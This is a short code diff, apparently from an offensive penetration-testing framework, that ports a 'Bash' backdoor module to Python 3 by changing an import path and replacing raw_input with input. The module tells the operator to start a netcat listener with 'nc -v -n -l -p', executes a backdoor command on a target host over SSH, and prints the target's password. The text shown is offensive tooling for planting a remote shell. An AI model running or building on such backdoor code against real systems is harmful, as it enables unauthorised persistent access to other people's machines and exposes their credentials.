@@ -1,4 +1,4 @@
-from backdoor import *
+from backdoors.backdoor import *
 
 class Bash(Backdoor):
     prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET 
@@ -22,7 +22,7 @@ class Bash(Backdoor):
         port = self.get_value("port")
         target = self.core.curtarget
         print(GOOD + "Initializing backdoor...")
-        raw_input(INFO + "Please create a listener with the command nc -v -n -l -p " + str(port))
+        input(INFO + "Please create a listener with the command nc -v -n -l -p " + str(port))
         target.ssh.exec_command(self.get_command())
         print(GOOD + "Bash Backdoor on port " + str(port) + " attempted. You may need to input the password, which is " + target.pword)
         for mod in self.modules.keys():
